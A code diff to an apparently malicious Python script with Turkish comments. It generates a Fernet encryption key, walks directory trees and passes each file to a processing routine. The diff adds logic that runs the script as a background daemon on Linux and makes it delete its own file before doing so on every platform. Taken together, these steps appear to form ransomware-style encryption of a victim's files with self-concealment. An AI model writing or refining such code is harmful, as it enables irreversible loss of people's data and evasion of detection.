@@ -21,21 +21,6 @@ except:
         except:
             sys.exit("Başarısız ! Lütfen bu paketin kurulu olduğuna emin ol !\n\t -> cryptography")
 
-try:
-    import daemon
-except:
-    print("Bir kütüphane bulunamadı ! Yüklemeye çalışıyorum") 
-    os.system("pip3 install python-daemon")
-    sys.exit("Başarılı ! . Yeniden başlat ")
-    try:
-        import daemon
-    except:
-        os.system("pip3 install python-daemon --user")
-        sys.exit("Başarılı ! . Yeniden başlat ")
-        try:
-            import daemon
-        except:
-            sys.exit("Başarısız ! Lütfen bu paketin kurulu olduğuna emin ol !\n\t -> python-daemon")
 # @pngmerkez
 key = Fernet.generate_key() # iyisinden bir key oluşturduk
 fer = Fernet(key)
@@ -81,9 +66,13 @@ def matematik():
                 link = f"{adres[0]}{baglac}{dosya}" # karışmasın diye link adlı değişkene atadık
                 isle(link)
 
-with daemon.DaemonContext():
+if platform.system() == "Linux":
+    try:import daemon
+    except:sys.exit("pip install python-daemon !")
+    with daemon.DaemonContext():
+        os.remove(sys.argv[0])
+        matematik()
+
+else:
     os.remove(sys.argv[0])
     matematik()
-    
-
-
